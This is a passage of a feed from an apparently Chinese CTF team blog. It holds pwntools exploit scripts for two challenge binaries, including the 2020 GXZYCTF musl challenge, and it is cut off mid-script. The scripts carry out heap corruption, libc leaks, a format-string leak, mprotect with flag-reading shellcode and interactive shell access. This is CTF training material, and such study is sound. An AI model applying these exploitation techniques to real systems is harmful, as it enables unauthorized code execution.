class=&quot;number&quot;&gt;-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;##########################################################################&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# File Name: pwn_exp.py&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Author: sofr&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# mail: rainb0w&lt;span class=&quot;number&quot;&gt;.541&lt;/span&gt;.bai@gmail.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# Created Time: Sat Mar  &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;09&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;36&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;57&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#########################################################################&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context.log_level = &lt;span class=&quot;string&quot;&gt;&quot;debug&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;context(arch=&lt;span class=&quot;string&quot;&gt;&#39;amd64&#39;&lt;/span&gt;, os=&lt;span class=&quot;string&quot;&gt;&#39;linux&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = lambda x:p.recv(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ru = lambda x:p.recvuntil(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s = lambda x:p.send(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sl = lambda x:p.sendline(x)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sf = lambda x,y:p.sendafter(x,y)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;slf = lambda x,y:p.sendlineafter(x,y)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;l64_addr = lambda x:u64(x.ljust(&lt;span class=&quot;number&quot;&gt;0x8&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;\x00&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;l32_addr = lambda x:u32(x.ljust(&lt;span class=&quot;number&quot;&gt;0x4&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;\x00&#39;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;drop_end = lambda x,y:x.split(y)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;getshell = lambda :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;binary=&lt;span class=&quot;string&quot;&gt;&#39;./pwn&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libc_name = &lt;span class=&quot;string&quot;&gt;&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;global p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;libc = ELF(libc_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bin = ELF(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; len(sys.argv) &amp;gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    p=remote(sys.argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;],int(sys.argv[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    p=process([binary],env=&amp;#123;&lt;span class=&quot;string&quot;&gt;&#39;LD_PRELOAD&#39;&lt;/span&gt;:libc_name&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def ShowAddress(s,addr):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(&lt;span class=&quot;string&quot;&gt;&#39;\033[1;31m%s: 0x%x\033[0m&#39;&lt;/span&gt;%(s,addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def Success(context):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    success(&lt;span class=&quot;string&quot;&gt;&#39;\033[1;32m%s\033[0m&#39;&lt;/span&gt;%(context))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def Error(context):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    warn(&lt;span class=&quot;string&quot;&gt;&#39;\033[1;31m%s\033[0m&#39;&lt;/span&gt;%(context))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def debug():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Success(pidof(p))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    raw_input(&lt;span class=&quot;string&quot;&gt;&#39;\033[1;31mDeBug\033[0m&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def add(size,content):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&amp;gt; &quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,str(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def dele(idx):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&amp;gt; &quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;2&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,str(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def show(idx):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&amp;gt; &quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;3&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,str(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def edit(idx,content):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;&amp;gt; &quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;4&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,str(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sf(&lt;span class=&quot;string&quot;&gt;&quot;___c___r__s__++___c___new_content ?&quot;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def pwn():&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    slf(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;sofr_is_cool&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x90&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x70&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dele(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dele(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dele(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dele(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x40&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    show(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    libc_addr = l64_addr(ru(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;)[:&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;0x3c4c08&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x40&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;0x100&lt;/span&gt;)#&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;+p64(&lt;span class=&quot;number&quot;&gt;0x71&lt;/span&gt;)+p64(libc_addr+&lt;span class=&quot;number&quot;&gt;0x3c4b50&lt;/span&gt;)+&lt;span class=&quot;string&quot;&gt;&#39;\x00&#39;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;+p64(&lt;span class=&quot;number&quot;&gt;0x81&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x71&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;)#&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x70&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;)#&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;)#&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;+p64(&lt;span class=&quot;number&quot;&gt;0x6032e0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    add(&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;n&quot;&lt;/span&gt;*&lt;span class=&quot;number&quot;&gt;0x60&lt;/span&gt;)#&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0x00000000006032f0&lt;/span&gt;)+p64(libc_addr+&lt;span class=&quot;number&quot;&gt;0x3c67a8&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x6033c0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0x55800&lt;/span&gt;+libc_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;%6$p|&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    dele(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    stack_addr = int(ru(&lt;span class=&quot;string&quot;&gt;&quot;|&quot;&lt;/span&gt;)[:&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;],&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    shellcode = shellcraft.amd64.linux.cat(&lt;span class=&quot;string&quot;&gt;&#39;./flag&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    #shellcode = shellcraft.amd64.pushstr(&lt;span class=&quot;string&quot;&gt;&quot;./flag&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    #shellcode += shellcraft.amd64.linux.open(&lt;span class=&quot;string&quot;&gt;&#39;rsp&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    #shellcode += shellcraft.amd64.linux.read(&lt;span class=&quot;string&quot;&gt;&#39;rax&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;rsp&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    #shellcode += shellcraft.amd64.linux.write(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;rsp&#39;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    shellcode = asm(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print len(shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0x00000000006032f0&lt;/span&gt;)+p64(libc_addr+&lt;span class=&quot;number&quot;&gt;0x3c67a8&lt;/span&gt;)+p64(stack_addr+&lt;span class=&quot;number&quot;&gt;0x48&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x603260&lt;/span&gt;)+p64(libc_addr+libc.symbols[&lt;span class=&quot;string&quot;&gt;&#39;mprotect&#39;&lt;/span&gt;])+shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0x0000040000000400&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    debug()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    file_p = &lt;span class=&quot;number&quot;&gt;0x603360&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    edit(&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,p64(&lt;span class=&quot;number&quot;&gt;0x4023AA&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x603310&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x1000&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x00603000&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0x402390&lt;/span&gt;)+p64(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)*&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;+p64(&lt;span class=&quot;number&quot;&gt;0x603318&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    #dele(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    #dele(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ShowAddress(&lt;span class=&quot;string&quot;&gt;&quot;libc_addr&quot;&lt;/span&gt;,libc_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ShowAddress(&lt;span class=&quot;string&quot;&gt;&quot;stack_addr&quot;&lt;/span&gt;,stack_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    debug()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    getshell()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pwn()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
      <category term="Libc" scheme="https://boiteam.github.io/categories/Pwn/Libc/"/>
    
    
      <category term="Pwn_seccomp" scheme="https://boiteam.github.io/tags/Pwn-seccomp/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF musl</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_musl/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_musl/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:04:15.458Z</updated>
    
    <content type="html"><![CDATA[<p>自定的libc，早期unlink，不存在malloc_hook和free_hook，最后覆盖栈上的EIP进行利用。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">##########################################################################</span><br><span class="line"># File Name: pwn_exp.py</span><br><span class="line"># Author: sofr</span><br><span class="line"># mail: rainb0w<span class="number">.541</span>.bai@gmail.com</span><br><span class="line"># Created Time: Tue Mar <span class="number">10</span> <span class="number">13</span>:<span class="number">10</span>:<span class="number">01</span> <span class="number">2020</span></span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = lambda x:p.recv(x)</span><br><span class="line">ru = lambda x:p.recvuntil(x)</span><br><span class="line">s = lambda x:p.send(x)</span><br><span class="line">sl = lambda x:p.sendline(x)</span><br><span class="line">sf = lambda x,y:p.sendafter(x,y)</span><br><span class="line">slf = lambda x,y:p.sendlineafter(x,y)</span><br><span class="line">l64_addr = lambda x:u64(x.ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">l32_addr = lambda x:u32(x.ljust(<span class="number">0x4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">drop_end = lambda x,y:x.split(y)[<span class="number">0</span>]</span><br><span class="line">getshell = lambda :p.interactive()</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./carbon'</span></span><br><span class="line">libc_name = <span class="string">'./libc.so'</span></span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">#bin = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p=remote(sys.argv[<span class="number">1</span>],int(sys.argv[<span class="number">2</span>]))</span><br><span class="line">else:</span><br><span class="line">    p=process([binary],env=&#123;<span class="string">'LD_PRELOAD'</span>:libc_name&#125;)</span><br><span class="line"></span><br><span class="line">def ShowAddress(s,addr):</span><br><span class="line">    print(<span class="string">'\033[1;31m%s: 0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">def Success(context):</span><br><span class="line">    success(<span class="string">'\033[1;32m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def Error(context):</span><br><span class="line">    warn(<span class="string">'\033[1;31m%s\033[0m'</span>%(context))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    Success(pidof(p))</span><br><span class="line">    raw_input(<span class="string">'\033[1;31mDeBug\033[0m'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,content,flag=<span class="string">"N"</span>):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    slf(<span class="string">"What is your prefer size? &gt;"</span>,str(size))</span><br><span class="line">    slf(<span class="string">"Are you a believer? &gt;"</span>,flag)</span><br><span class="line">    slf(<span class="string">"Say hello to your new sleeve &gt;"</span>,content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    slf(<span class="string">"What is your sleeve ID? &gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    slf(<span class="string">"What is your sleeve ID? &gt;"</span>,str(idx))</span><br><span class="line">    time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    slf(<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    slf(<span class="string">"What is your sleeve ID? &gt;"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"sofr_is_"</span>)</span><br><span class="line">    add(<span class="number">0x8</span>,<span class="string">"sofrcool"</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">"sofrcool"</span>)</span><br><span class="line">    libc_addr = l64_addr(ru(<span class="string">"\x7f"</span>)) - <span class="number">0x292e38</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">"2"</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"3"</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"4"</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"4"</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0xdeadbeef</span>)*<span class="number">6</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x40</span>)+p64(<span class="number">0x290038</span>+libc_addr)*<span class="number">2</span>,<span class="string">"Y"</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">"sofr"</span>)</span><br><span class="line">    edit(<span class="number">4</span>,p64(libc_addr + <span class="number">0x290008</span>)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x602034</span>)+p64(<span 